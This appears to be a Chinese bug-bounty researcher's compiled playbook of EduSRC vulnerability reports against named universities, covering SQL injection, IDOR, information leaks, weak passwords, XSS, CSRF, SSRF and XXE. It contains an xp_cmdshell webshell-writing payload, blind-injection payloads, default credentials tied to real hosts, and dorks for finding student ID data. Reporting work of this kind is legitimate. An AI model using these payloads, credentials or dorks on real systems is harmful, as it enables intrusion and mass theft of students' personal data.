| 2.10.7 | 烟台大学 教工报销 | `where` | union 9 列 + 堆叠无回显；`union select name,... from dbo.sysobjects where xtype='U'` 找表，再 `;exec master..xp_cmdshell 'echo <%@ Page ...eval(Request.Item["ytu"])%> >> e:/.../2.aspx'` 写马 | getshell（高危 Rank 6） |
| 2.10.8 | 上海交大 `yjs.naoce.sjtu.edu.cn` | 注册资料包 | MySQL 布尔盲注 `If(1=1,1165,0)` / `if((left(database(),1)='a'),1165,0)`，依回显 1165/0 判定 | 高危 |
| 2.10.9 | 山东理工大学 | `/login.aspx` 的 `txtYHM` | MSSQL 注入 → `xp_cmdshell` 提权 → powershell 反弹（**作者声明未脱库、未横向**） | RCE |

**小结**：教育站注入集中在**登录/注册/日志查询/统计/选择单位**参数，且**盲注占绝对多数**；**必须接上 getshell、越权打包或 WAF bypass 才给高危/严重**，纯盲注无利用链压到中危且同类重复仅 1~4 分。小程序/JSON 接口是新兴高发区；sqlmap 跑小程序需在 host 后加 `:443`。

### 2.11 信息泄露（教育侧重灾区）

| # | 学校 / 系统 | 泄露点 | 内容 | 定级 |
|---|------------|--------|------|------|
| 2.11.1 | 北京中小学学籍管理云平台 | `/api/actuator/heapdump` 未授权 + 8848 `nacos/nacos` | heapdump_tool 解密出 redis / oracle 连接口令 | 高 |
| 2.11.2 | 电子科技大学 | 统一认证后各业务接口返回包带 `sfz` 字段 | 教职工体检预约、出国无犯罪证明、电子证明验证 | 中 |
| 2.11.3 | 陕西师范大学 · 正方学工 | `xgxt/mmzhgl_mmzh.do?method=xgmm&yhm=zf01` | 重置内置超管 → 查看在校+非在校共 **4.6 万余条**学生身份证/手机/家庭地址 ⚠️ | 严重(8) |
| 2.11.4 | 十堰高级职业学校 · 阳光心健 | `admin/userfiles/2018在校生综合信息查询.xls` 列目录 + `admin/PowerConfig.aspx` 未授权 | 下载专区泄露学生信息，结合 S2-045/S2-019 可 getshell | 高危(8) |
| 2.11.5 | 湘潭大学 · 正方学工 | `xsxx_xsgl.do?method=showStudentsAjax&isAll=true`、`getXsjbxxMore&xh=` | 低权限越权遍历全部学生敏感信息，可脚本批量 | 中危(4) |
| 2.11.6 | 某酒店 App（移动端） | 请求头 `HOST` 暴露真实 IP → 直访 IP 触发目录遍历 | 站点目录结构 | 中 |

**信息收集手法（教育侧特有）**：Google dork `site:xxx.edu.cn intext:身份证 filetype:pdf/xls/doc`、`"学号" "姓名"`、`"sfz" filetype:pdf`；批量打全国院校时替换"职业技术学院/美术学院"等校名 + "统一采购/单一来源采购"等功能词。

**小结**：泄露集中在 ①**统一认证后的业务接口未脱敏**（"过统一认证即信任内部接口"是常见误配）、②**正方 xgxt / 学工系统遍历参数**、③**报表按学号/工号遍历**、④**公示页/采购/成绩类 `.xls/.pdf`**。凡"全校量级 + 身份证/人脸"的，定级普遍高于普通信息泄露。

### 2.12 认证与口令

| # | 学校 / 系统 | 命中方式 | 打进去能做什么 |
|---|------------|---------|--------------|
| 2.12.1 | 上海交大 邮件系统（SOGo）`202.120.2.238` | 出厂默认：`system:system`、`admin:moohoo` | 管理员权限：配邮件路由、账号、隔离策略 |
| 2.12.2 | 同济大学 云媒体平台 `v.tongji.edu.cn` | `admin:admin888` | 超管：录课、校区/教学楼/教室、作息课程表、用户与视频 |
| 2.12.3 | 新疆交通职业技术学院 学生信息系统 | 全校默认密码 `123456` | 学工处超管登录 → **免统一认证直达内网门户**（约 882 条学生敏感信息） |
| 2.12.4 | 浙江大学 `evolution.zju.edu.cn/phpmyadmin/` | `admin` **空密码** | 直进数据库管理端，查/导 `information_schema`、执行 SQL |
| 2.12.5 | 浙江大学 能源系统 `:8083` | `admin` + 强随机口令（**源自配置/源码泄露**，凭据不转写） | 系统管理功能；证明"非弱格式但已泄露"同样高危 |

**小结**：教育侧高价值目标＝**统一身份认证 / 教务 / 学工 / 一卡通 / 财务 / 研究生系统**；初始口令常为**身份证后六位**或统一 `123456`；各子系统常"免统一认证"互信，单点弱口令即可横向触达全校师生高敏数据。**论证"打进去后能读全校数据"是升档关键**。

### 2.13 其他类型（XSS / CSRF / SSRF / XXE）

- **2.13.1 XSS — 同济大学 科技情报服务平台（中危）**：`cscy.tongji.edu.cn/kycgfwptweb` 的"人工收引证明 → 我的委托 → 附件导入"，先传 `.txt` 再抓包改后缀为 `.html`、内容写 `<script>alert('xss')</script>`，下载路径被浏览器解析弹窗。**教育侧 XSS 几乎全集中在"附件/证明文件上传改名 html"这一个功能点**。另一份上交大同手法报告明文写出真实账号密码 ⚠️——**提交时必须对学号/账号/身份证打码**，这是教育侧比企业 SRC 多出的一条红线。
- **2.13.2 CSRF — 同济大学 招聘系统改密**：`POST /rsfw/sys/zpglxt/zpww/savePassword.do`，请求体 `data=` 含旧/新密码，后端仅靠 Cookie（`JSSESSIONID`/`_WEU`）鉴权，无 token、无 `Referer`/`Origin` 校验（仅前端 JS 提示），cookie 无 `SameSite` → 受害者打开公网 PoC 即被静默改密。**同一漏洞两次提交分别定中危/低危**，差异全在危害论证详略。升档要点：强调"**无需任何交互 + 可批量改密接管 + 涉及招聘敏感信息**"。
- **2.13.3 SSRF — 兰州大学 九思协同办公 jsoa**：`oa.lzu.edu.cn` 的 `/jsoa/GetRawFile?url=` 可代发任意请求——`url=http://www.baidu.com` 回显百度首页；`127.0.0.1:80` 返 200、`:81` 返 500 探端口；VPS 日志收到来自兰大公网出口的连接坐实可达。⚠️ 原报告另提"用钓鱼网站钓取用户名密码"，**属社工，SRC 验证止于证明可达**。
- **2.13.4 XXE — 某医科大学 WordPress `xmlrpc.php`**：`system.listMethods` 枚举到 `pingback.ping`，在其 XML 体中植入外部实体指向 DNSLog，收到回调即证明可解析外部实体且能出网（并存 SSRF 链）。⚠️ 同报告另展示后台 `stuPay/datas` 泄露真实学生姓名/学号——**上报只引 XXE 本身，不附带、不扩散个人字段**。

**小结**：这四类在教育侧样本都薄（各 1~4 条），但打法高度雷同——**老系统 + 遗留接口 + 只靠 Cookie 鉴权**。排查时优先枚举 `xmlrpc.php`、SOAP、SAML 等 XML 入口，以及 `.do` 老接口的写操作。

---

## 三、按功能点的排查 Checklist（教育行业优先）

### A. 账号接管路径（优先级最高）
1. [ ] 官网搜 `site:*.edu.cn "公示" filetype:xlsx` → 收集**学号 + 姓名**；
2. [ ] 找回密码页：数几个必填因子？是否"任选 N 项"？是否只填手机号即可？
3. [ ] 改绑手机/邮箱：验证码失败时，改响应包能否放行？
4. [ ] 改资料/改密接口：目标用户是否由 `user_id` / Cookie（`webUserName` 等）决定？替换 id 试试；
5. [ ] Cookie 里有没有明文密码 / 学号 / 角色字段。

### B. 未授权接口（教育系统重灾区）
1. [ ] 登录页 / 前台配置页能否直接访问后端功能页（`/homepz.html`、`/*setup*`、`/config`）？
2. [ ] 抓包看接口是否是 `?method=xxx` 风格（epay）→ 逐个试 `FindList` / `resetPwd` / `Update` / `Delete`；
3. [ ] 分页查询接口（`*ForPage` / `*find*`）是否鉴权？`pageSize` 调大能否拖库？
4. [ ] 是否只校验 `key_id` / `user_id` 而不校验操作者身份？

### C. 权限判定
1. [ ] 会话/个人信息接口（`/api/v1/sessions`）返回体是否含 `role` / `isAdmin`？改成高权试试；
2. [ ] 小程序登录接口返回体是否含 `hasLocalAccount` / `isBind`？改 0→1 试试。

### D. 验证码 / 短信
1. [ ] 验证码几位？是否纯数字？
2. [ ] 有无失败次数限制 / 锁定 / 图形码升级？
3. [ ] 发码接口有无频控（→ 短信轰炸）？

### E. 通用系统指纹
1. [ ] 登录页 footer、报错页、静态资源路径是否暴露厂商（智汇安新/依能/南软）？
2. [ ] 默认密码是否为 `Axf@0xxxx` / `jjkjzz111` / `1120` 类？
3. [ ] 一套系统多校复用 → 用同厂商另一校的已知手法复核本目标。

---

## 四、指纹 × 打法速查表（教育行业）

| 指纹 / 特征 | 关联系统 | 已知打法 | 定级 |
|------------|---------|---------|------|
| `?method=sysuserFindList` / `resetPwd` / `sysuserUpdate` | **E支付 / 智汇安新 epay** | 未授权拖库 + 仅凭 key_id 改任意密码 + 加 `role_id` 垂直提权 | 高 |
| 默认口令 `Axf@02692` / `Axf@02768` | 同上（epay） | 超管/低权同默认密码，直接接管 | 高 |
| `/smesis/...findRSGLSysUser...ForPage` | **yn智慧校园 / 依能科技** | 接口未鉴权拖全校师生（手机/身份证/密码/token） | 高 |
| 默认口令 `jjkjzz111` | 同上 | 默认密码登录 | 高 |
| `gmis` 路径 + `.aspx` | **南京南软研究生管理系统** | 列目录 + 堆叠注入 + base64 绕 WAF 写马 getshell | 高（Rank 5）|
| `/epay/login`（多校同页） | E支付 | 见上，**同一套系统横向套用** | 高 |
| `/his/h21_ylzh/querybyany` | 校园医院 HIS | 未鉴权按学号查就诊卡敏感信息并反手登录 | 中/高 |
| `/api/v1/sessions`（Laravel） | 各类 SPA 后台 | 返回包 `role` 改 1 伪超管 | 高 |
| `/homepz.html` / 前台配置页 | 高校仪器共享平台 | 未授权改数据库配置 | 高 |
| `activity.lib.*/edit_my.aspx?user_id=` | ASP.NET 报名/会员系统 | IDOR 替换 user_id 改他人密码 | 中 |
| Cookie `webUserName=str_key=<学号>` | 校园自建后台 | 改 Cookie 水平越权读他人资料（含明文密码） | 中 |
| 短信验证码 4 位纯数字 | 各类登录/登记系统 | Intruder 0–9999 全空间爆破 | 高 |
| 小程序 `/wx/login.php` 返回 `hasLocalAccount` | 高校小程序 | 改返回包 0→1 绕过绑定 | 中 |

### 越权 / 未授权相关指纹（§2.8 补充）

| 指纹 / 特征 | 关联系统 | 已知打法 | 定级 |
|------------|---------|---------|------|
| `/manage/StudentInfoEdit.aspx?Xsxh=` + `/manage/RecommendationForm.aspx?Xsxh=` | **就业信息服务网（多校同源码：上海理工/上海商学院）** | 未登录直访 + 遍历学号拉全校学生信息 | 中 |
| `/manage/downloaddata.aspx`（无 Cookie） | 高校就业网后台 | 未登录按毕业年份导出全部学生 PII | 高 |
| `/dcp_sis/…tyxxzcsq.action`（`method=getObjList`） | 学团/学工系统（webvpn 下） | POST body `list` 数组改学号遍历 | 高 |
| `?insuranceApplicationId=` / `?autoids=` / `?applyId=` / `?pid=` | 学工/接口/办事流程 | 自增/可枚举 ID 直接遍历拉 PII | 中–高 |
| `/lcpz/fjgl_index.jsp`（`Operation_Code=`） | **采购/报名管理系统** | 删上传响应中的 `jpg$1` 后缀串绕校验 → 拖全量附件 | 高 |
| 同 IP 暴露 swagger + 学生查询接口 | 一卡通/智慧校园 | 枚举 id 拉含**明文密码**的学生信息 | 高 |
| 登录响应含 `status`/`SignId` | 前后端分离后台（兰大 HR 等） | 改 `status:2→1` / `SignId:-1→1` 绕登录 | 高 |
| `/auth/switchPosition`（`positionId=1`） | 证书/研究生系统 | 学生账号调该接口直接变管理员 | 高 |

### 其余类型指纹（§2.9~§2.13 补充）

| 指纹 / 特征 | 关联系统 | 已知打法 | 定级 |
|------------|---------|---------|------|
| `commXszz.do?method=uploadFile` + `mmzhgl_mmzh.do?method=checkYh` | **正方学生工作管理系统**（多校） | 传 `jspx` 马；请求体追加上千个 `&a=1` 绕参数式 WAF；Tomcat `aliases` 别名映射落马 | 高 |
| `student/grgl/uploadkszp`（`.aspx`） | **南京南软研究生管理系统 V5.0**（多校） | 头像处直传 `.aspx`（后端只删"学号+白名单后缀"）；`jsbh` 参数可跨目录写根目录 | 高（Rank 6） |
| `fxglAction.do?method=fxbmzctz`（`.do`） | **强智教务管理系统** | S2-020 改 `class.classLoader...docBase=/` 读全量文件 → 审计拿后台配置 | 中–高 |
| 图片地址上传（`.aspx`） | **南京先极实验/创新管理系统**（多校） | 抓包改后缀 + 填垃圾字符 + `<header runat="server"/>` + 文件名加 `../`；或 `asmx`+空格 + 插换行拆词 | 高 |
| 个人信息→修改相片 | **微宏 OA** | 传 jsp 马抓包把 `ext` 改回 `jsp`；文件名 `../../server/wh/;/../a` | 高（Rank 6） |
| `/xupload/uploadUserImg?fileType=1` | 二开学工/人事后台 | 黑名单列了 `.jsp` 却仍放行，返回路径直连 | 高 |
| `dataScope` 参数（`POST /system/role/list`） | 若依系二开后台 | `extractvalue` XPATH 报错回显注入 | 高 |
| `/jsoa/GetRawFile?url=` | **九思协同办公 jsoa**（多校） | SSRF：代发任意请求、探内网端口、坐实公网出口 | 中–高 |
| `xmlrpc.php` + `pingback.ping` | 高校 WordPress 站 | 外部实体指 DNSLog，回调即证 XXE + 出网（并存 SSRF 链） | 中 |
| `/api/actuator/heapdump` 未授权 + 8848 端口 | SpringBoot 教育平台 / Nacos | heapdump_tool 解密出 redis、oracle 连接口令；`nacos/nacos` 弱口令 | 高 |
| `savePassword.do` 类写接口（`.do` 老系统） | 遗留 Java Web（招聘/人事） | 仅 Cookie 鉴权、无 token 无 SameSite → 静默改密 | 中–低 |
| 附件/证明上传后改名 `.html` | 科技情报/学工证明平台 | 传 `.txt` 抓包改后缀写 `<script>` → 存储型 XSS | 中 |
| `admin:admin888` / `system:system` / `admin:moohoo` / 空密码 phpMyAdmin | 云媒体平台 / SOGo 邮件 / 数据库管理端 | 出厂默认口令直登 | 高 |
| `/api/v1/user?get_users_info&autoids=` + `/api/v1/param` | 虚拟仿真/实验平台 | 未授权遍历用户 + 泄露数据库凭据 | 高 |
| `/asdcthethics/privisys/queryqg_user.action`（`dataxml` 含 `userid`） | 自建 IRB/审批系统 | 改 `userid` 遍历至 admin | 中 |
| `/sg-stu-app/stu/getMembers.do` | 宿舍管理系统 | js 里发现的未授权接口，拖全校宿舍+身份 | 中–高 |
| `/talk/UserDetail.jspx?id=<UUID>` | 教育局在线考试系统 | 无痕直访查看/修改用户资料 | 高 |
| `WriteMsg.jsp` / `cysyj_EditPage.jsp`（带学号） | 校园统一消息/选调系统 | 按学号对任意人发消息（冒用） | 高 |
| `/wec-self-print-app-console/…preview/terminal?reportPathParam=` | 自助打印/电子证明 | 改 `reportPathParam` 下他人在读证明 | 中 |
| `loginUserl`（拼接了登录学号的导出参数） | 智慧学工自助打印 | 改 `loginUserl` 导出他人学工信息 | 中 |
| 小程序 `js_code` 当身份凭证 | 后勤商贸小程序 | 替换他人 `js_code` 越权拉订单 | 中 |

---

## 五、案例索引（21 份唯一文件 → 15 个不同案例）

| 报告文件（序号见 `_work/unique-list-edusrc.md`） | 目标 | 归入章节 | 定级 |
|---|---|---|---|
| #1 北京值得买科技股份有限公司存在逻辑漏洞.pdf | 什么值得买（企业资产，归档于 EduSRC） | 2.1-① | 高 |
| #2 + #3 广东东软学院存在逻辑缺陷（2 份，仅版式不同） | epay.nuit.edu.cn | 2.2-④ | 高 |
| #4 + #5 广西师范大学逻辑缺陷（docx / pdf） | gxsdxyy.gxnu.edu.cn | 2.2-⑥ | 中/高 |
| #6 河南师范大学…研究生管理系统V3.0.html | yjs.htu.edu.cn/gmis | 2.6-⑫ | 高 |
| #7 江西九江科技中等专业学校存在逻辑缺陷.pdf | jjkj.ynedut.com | 2.2-⑤ | 高 |
| #8 清华大学-任意逻辑缺陷打包.docx | ehs.chemeng.tsinghua.edu.cn | 2.1-② / 2.4-⑩ | 高 |
| #9 四川大学逻辑漏洞.pdf | xsc.scu.edu.cn / mail.stu.scu.edu.cn | 2.1-② | 高 |
| #10 上海交大验证码爆破.pdf | es.sjtu.edu.cn | 2.4-⑨ | 高 |
| #11 + #14 + #15 上海交通大学（逻辑缺陷 / -存在逻辑缺陷 / 逻辑缺陷.pdf 共 3 份） | activity.lib.sjtu.edu.cn/keyi2021 | 2.1-③ | 中 |
| #12 + #13 + #16 上海交通大学（-2.doc / -2.pdf / 上海交通大学.pdf 共 3 份） | chuntsung.sjtu.edu.cn | 2.3-⑦ | 高 |
| #17 上交大 逻辑缺陷.png（OCR 完整） | 61.173.48.179:18108 | 2.3-⑧ | 高 |
| #18 上交逻辑.png（OCR 不完整） | 上海交大网课购买系统 | 2.7 | 中 |
| #19 陕西省石油化工学校存在逻辑缺陷 教育漏洞报告平台.pdf | 47.101.62.10:8082/epay | 2.2-④ | 高 |
| #20 浙江大学-存在逻辑缺陷.docx | nano.intl.zju.edu.cn | 2.1-③ | 中 |
| #M1 上海交大小程序——逻辑漏洞（打码）.docx | 微信小程序「交大人」 | 2.5-⑪ | 中 |

> **去重说明**：21 份唯一文件里，`#2/#3`、`#4/#5`、`#12/#13`、`#11/#14` 属同内容不同格式/版式；`#11/#14/#15` 指向同一子系统（科艺 IDOR 改密），`#12/#13/#16` 指向同一子系统（菁政 role 篡改）——**因 file_size 不同按"大小不同一律实读"原则各自保留并实读，已确认内容等价或同主题**。原始 27 条另有 5 组纯副本（见 `_work/unique-list-edusrc.md` 第一节）。

### 越权 EduSRC 索引（47 条 → 42 份唯一 → §2.8）

| 序号（见 `_work/unique-list-idor.md` §二） | 目标 | 归入 | 定级 |
|---|---|---|---|
| E1+E2 亳州学院-存在越权（pdf/docx） | `oshall.bzuu.edu.cn/zhxy` | 2.8.1-⑤ | 中 |
| E3+E4 东北林业大学越权（pdf×2） | `i.webvpn.nefu.edu.cn` 学团/外事 | 2.8.1-① | 高 |
| E5+E6 电子科技大学小程序越权（pdf/png） | `hq.uestc.edu.cn.cn` 后勤小程序 | 2.8.1-⑤ | 中 |
| E7+E8 广东培正学院用户遍历（docx/pdf） | `pzxg.peizheng.edu.cn/sms3` | 2.8.1-① | 中 |
| E9+E10 广西大学-swaager未授权（jpg/pdf） | `210.36.24.23:8010` 一卡通 | 2.8.1-① | 高 |
| E11+E12 华东师范大学接口未授权（doc/pdf；E11 读取失败） | 采购报名管理系统 | 2.8.1-③ | 高 |
| E13 华东师范未授权.doc（实为华东理工） | `career.ecust.edu.cn` | 2.8.1-⑤ | 高 |
| E14 江苏海洋大学·南软研究生 V4.0 | 未授权上传绕 WAF getshell | 2.8.1-③ | 高（Rank7） |
| E15 兰州大学4.pdf（后勤 HR） | `hr.lz-cc.com` | 2.8.1-② | 高 |
| E16+E17 兰州大学-存在未授权（doc/pdf；E16 读取失败） | `120.55.183.163:7000` 萃英学院 | 2.8.1-② | 高 |
| E18 南开大学某系统的渗透测试.doc | 证书站/研究生系统（综合） | 2.8.1-② | 高 |
| E19 南开大学.pdf | `suguan.nankai.edu.cn` 宿舍 | 2.8.1-④ | 中–高 |
| E20 清华大学水平越权.docx | `irb.med.tsinghua.edu.cn` | 2.8.1-④ | 中 |
| E21 上海交大越权.pdf | 交大就业小程序（`qxid`） | §2.8.1-⑤ / 3.2 | 中–高 |
| E22+E23+E24 上海交通大学越权打包（pdf×3） | `sa.sjtu.edu.cn` 院系管理 | 2.8.1-③ | 高 |
| E25 上海交通大学 _ 教育漏洞报告平台.pdf | 虚拟仿真平台（多域名） | 2.8.1-③ | 高 |
| E26 上海交通大学—越权（打码）.pdf | ＝逻辑漏洞科艺 IDOR（**跨目录重复**） | 引用 §2.1-③ | 中 |
| E27 上海交通大学—箸政…越权（打码）.pdf | ＝逻辑漏洞菁政 role 篡改（**跨目录重复**） | 引用 §2.3-⑦ | 高 |
| E28 上海理工接口未授权.pdf | `91.usst.edu.cn` | 2.8.1-① | 中 |
| E29+E30 上海商学院接口未授权（doc/pdf；E29 读取失败） | `jiuye.sbs.edu.cn`（同款系统） | 2.8.1-① | 中 |
| E31 上交大未授权访问.docx | ＝逻辑漏洞小程序 `hasLocalAccount`（**跨目录重复**） | 引用 §2.5-⑪ | 中 |
| E32–E36 同济大学越权 1~5（png） | 证明/就业/测评/消息 8 个越权点 | 2.8.1-① | 高 |
| E37+E38 新疆交通职业技术学院--越权（docx/pdf） | 智慧学工自助打印 | 2.8.1-① | 中 |
| E39 xx学院+教育局+某考试院 | 未授权 + 表单时间盲注 | 2.8.1-④ | 高 |
| E40 浙江大学-水平越权高危.doc | **读取失败** | §七 | — |
| E41 中南财经政法大学越权（打码）.pdf | **读取失败** | §七 | — |
| M1 上海交大——交大知行安泰小程序——越权 | ＝Web W39（`773498`，**跨目录重复**） | 引用 `idor-cases.md` §3.2 | 中 |

> **跨目录重复说明**：E26/E27/E31 与逻辑漏洞 EduSRC 目录内容一致（file_size 相同），M1 与越权 Web W39 一致——已由 `logic-web-cases.md`/`edusrc-cases.md` §2.1·§2.3·§2.5 覆盖，不重复精读。同济 5 图（E32–E36）与越权 Web 的 W44–W48（微信图片 5 张）逐字节相同，保留 EduSRC 侧精读。

### 其余类型 EduSRC 索引（≈83 条 + 9 篇 getshell 长文 → §2.9~§2.13）

| 章节 | 类型 / 来源 | 原始条数 | 去重后 | 实读 | 有效案例 | 备注 |
|------|------------|---------|--------|------|---------|------|
| §2.9 | 校园 getshell 长文（其他/EduSRC）+ 文件上传 EduSRC | 9 + 6 | 15 | 12 | **12** | 3 份读取失败/非上传（见 §七） |
| §2.10 | SQL注入 EduSRC + 命令注入 EduSRC | 43 + 2 | 35 + 2 | 10 | **9** | 吉林工业 OCR 乱码仅标题可判；北京大学 `220030` 失败 |
| §2.11 | 信息泄露 EduSRC + App | 7 + 2 | 6 + 1 | 7 | **6**（+1 移动端） | 含 1 份方法论稿 |
| §2.12 | 弱口令 EduSRC | 10 | 8 | 7 | **5** | 1 份"不打码"孪生件按红线不转写 |
| §2.13 | XSS + CSRF + SSRF + XXE（EduSRC） | 4+4+2+1 | 2+1+1+1 | 5 | **4** | XSS 两份同手法；SSRF 双格式只算 1 案 |

---

## 六、定级观察（教育行业）

- 逻辑漏洞批 15 案中 **10 案为高**，集中在：拖库（师生身份证/密码/token）、任意密码重置、getshell、垂直提权。
- **中危 3 例**：ASP.NET 报名系统 IDOR 改密（自述中危）、Cookie 水平越权、小程序绕过绑定。
- 教育行业**单个"未授权拖师生库"往往一次覆盖数千到 3.5 万人**，危害量级高于同技术难度的企业目标——**优先打"能批量出数据"的接口**（`FindList` / `*ForPage`），成单最稳。
- **越权批新增观察（EduSRC 42 份）**：
  - **高**：批量拖学生 PII（东北林大、广西大学含明文密码、上海交大仿真平台含库凭据）、响应包绕登录后导出（兰大 HR 1700+、萃英学院可建管理员）、垂直提权（南开 `switchPosition`）、未授权上传 getshell（南软 V4.0）、拖 2764 份证件照（华东师范采购）、可改校级配置（上海交大 `sa`）。
  - **中**：单次读单人 PII 的水平越权（亳州、培正、新疆交通）、未授权遍历（上海理工/上海商学院就业网、清华 IRB、南开宿舍）。
  - **规律**：`危害 = 能否批量 × 数据敏感度`。同样是"改 id 越权"，**能遍历全表 → 高；只能读一条 → 中**。所以优先验证"id 是否自增/可枚举"与"`pageSize` 能否调大"。
  - **教育特色放大器**：**统一身份认证后的子系统缺二次鉴权**（北林/兰大/南开/同济反复出现）+ **一套系统多校复用**（就业信息服务网、epay、依能、南软）——打通一个即可横向刷多校。
- **其余类型批新增观察（§2.9~§2.13，约 50 份）**：
  - **严重/高危**：getshell 类（§2.9 全部 12 案，Rank 3~6）、注入接上 `xp_cmdshell` 写马或 RCE（2.10.7 烟台大学、2.10.9 山东理工）、批量 PII（陕西师范 4.6 万条 **严重(8)**、十堰高职 **高危(8)**）、heapdump+Nacos 拿全量服务口令（2.11.1）、**默认/空口令直登**（2.12 全部）。
  - **中危**：纯盲注无利用链（2.10.2 "九连杀"同类重复仅 1~4 分）、单次读单人 PII、附件改名 html 的存储 XSS、老 `.do` 接口的 CSRF 改密、**无回显 XXE/SSRF 只证明可达**。
  - **低危 … 也能升档**：同济 CSRF 改密**同一漏洞两次提交分别定中危/低危**，差异全在危害论证——**写"无需交互 + 可批量接管 + 涉及敏感数据"三要素**即可稳定中危。同理，弱口令若只写"admin/123456"常被压低，**补一句"进去能读全校 X 条学籍/财务数据"**立刻升档。
  - **规律**：`危害 = 量级 × 敏感度 × 是否可批量`。教育侧的"量级"天然大（全校师生），**所以比企业侧更容易把中危推上高危——前提是你得把量级写出来**。

---

## 七、素材缺口（需在 ima 客户端补）

| 项 | 情况 | 待补 |
|---|------|------|
| #18 `上交逻辑.png` | 图片 OCR 不完整 | 完整绕过步骤缺失，仅知价格参数 27810 与测试账号；需打开原图补录 |
| #17 `上交大 逻辑缺陷.png` | OCR 完整，已提炼 | 无需补 |
| 逻辑漏洞批读取失败项 | **无**（21/21 全部成功，与 Web 批次不同） | — |
| **E11 `华东师范大学接口未授权.doc`** | 两次返回空（由 E12 pdf 覆盖） | 内容已由 pdf 版承载，可选补 |
| **E16 `兰州大学-存在未授权.doc`** | 两次返回空（由 E17 pdf 覆盖） | 内容已由 pdf 版承载，可选补 |
| **E29 `上海商学院接口未授权中危.doc`** | 两次返回空（由 E30 pdf 覆盖） | 内容已由 pdf 版承载，可选补 |
| **E40 `浙江大学-水平越权高危.doc`** | `code:220030`，无同源版 | **内容缺失**，需 ima 客户端打开补录 |
| **E41 `中南财经政法大学越权（打码）.pdf`** | `code:220030`，无同源版 | **内容缺失**，需 ima 客户端打开补录 |
| **吉林工业职业技术大学 WAF bypass** | OCR 乱码，仅标题可判 | payload 缺失，需在 ima 客户端打开原图/原文补录 |
| **北京大学 SQL 注入** | `code:220030` | 内容缺失，需补录 |
| **河海大学 · 南软 V5.0（教师权限）** | ima 接口"文件获取失败" | 按同系统规律（§2.9.2/§2.9.8）补写，**未实读** |
| **重庆医科大学 · 南软 V5.0（无限制）** | ima 接口"文件获取失败" | 同上，**未实读** |
| **四川省双流中学 文件上传** | `code:220030` | 内容缺失，需补录 |
| **同济大学 文件上传** | 返回空 | 内容缺失，需补录 |
| **兰州大学 SSRF `.doc`** | 返回空（`.pdf` 版已读） | 内容已由 pdf 版承载，可选补 |

---

## 八、后续扩展位（P3 计划）

本文件按"教育业务场景"组织，后续 EduSRC 各类报告直接按场景并入：
- ~~**越权 EduSRC 47 份** → 并入 §2.1（账号接管）/ §2.3（提权越权）~~ ✅ **已完成 2026-09-14**：实读后按**教育业务场景**新建 §2.8（8 大场景 + 5 组详录 + Checklist + 指纹表），比硬塞进 §2.1/§2.3 更清晰。EduSRC 越权 47 条 → 42 份唯一（其中 E26/E27/E31/M1 为跨目录重复、E40/E41 读取失败、E11/E16/E29 由同源 pdf 覆盖）→ 有效新案例 **34 份**；
- ~~**其他 EduSRC 185 份** → 建议先做构成调研（P1-4），再决定章节划分~~ 🟡 **构成调研已完成 2026-09-14**（见 `other-census.md`）：该目录是"未归位附件倾倒口"，其中 **9 篇校园 getshell 长文已并入本文件 §2.9**；其余（单点提交归档约 56 条等）只留档于 `archive-inventory.md`，**不作全量精读**；
- ~~**SQL注入 43 / 文件上传 6 / 命令注入 2** → 新增"§ 服务器权限获取"章~~ ✅ **已完成 2026-09-14**：按场景拆为 §2.9（getshell 与上传）+ §2.10（注入→命令执行）；
- ~~**信息泄露 7 / 弱口令 10** → 并入 §2.2 / 强化 §1 的默认口令表~~ ✅ **已完成 2026-09-14**：新建 §2.11（信息泄露）+ §2.12（认证与口令）；
- ~~**XSS 4 / CSRF 4 / SSRF 2 / XXE 1** → 体量小，可压成一节"少量类型精选"~~ ✅ **已完成 2026-09-14**：合并为 §2.13（其他类型）。

---

## 九、进度

| 批次 | 原始条数 | 唯一份数 | 有效新案例 | 状态 |
|------|---------|---------|-----------|------|
| 逻辑漏洞（Web） | 195 | 88 | 88 | ✅ 见 `logic-web-cases.md` |
| 逻辑漏洞（EduSRC + 小程序） | 27 | 21 | 15 | ✅ 本文件 §二 |
| **越权（EduSRC + 小程序）** | **48** | **43**（42 + M1） | **34** | ✅ **本文件 §2.8（2026-09-14）** |
| 越权（Web） | 120 | 70 | ≈40 企业实战 | ✅ 见 `idor-cases.md` |
| 其他 EduSRC | 185 | 已调研 | 9（getshell 长文→§2.9） | 🟡 **构成调研已完成**（`other-census.md`）；单点归档见 `archive-inventory.md`，不精读 |
| SQL注入 EduSRC | 43 | 35 | 9 | ✅ **本文件 §2.10（2026-09-14）** |
| 命令注入 / RCE EduSRC | 2 | 2 | 1 | ✅ **本文件 §2.10.9** |
| 文件上传 EduSRC | 6 | 6 | 3 | ✅ **本文件 §2.9.10~2.9.12** |
| 信息泄露 EduSRC + App | 9 | 7 | 7 | ✅ **本文件 §2.11** |
| 弱口令 EduSRC | 10 | 8 | 5 | ✅ **本文件 §2.12** |
| XSS EduSRC | 4 | 2 | 2 | ✅ **本文件 §2.13.1** |
| CSRF EduSRC | 4 | 1 | 1 | ✅ **本文件 §2.13.2** |
| SSRF EduSRC | 2 | 1 | 1 | ✅ **本文件 §2.13.3** |
| XXE EduSRC | 1 | 1 | 1 | ✅ **本文件 §2.13.4** |

> **EduSRC 教育侧合计**：已闭环 ≈ **380 份**（逻辑 27 + 越权 48 + 其余九类 ≈83 + 其他 EduSRC 中已取用的 9 篇 + 其余调研覆盖）。剩余为「其他/EduSRC」中判定"只归档不精读"的部分，已在 `archive-inventory.md` 留档。
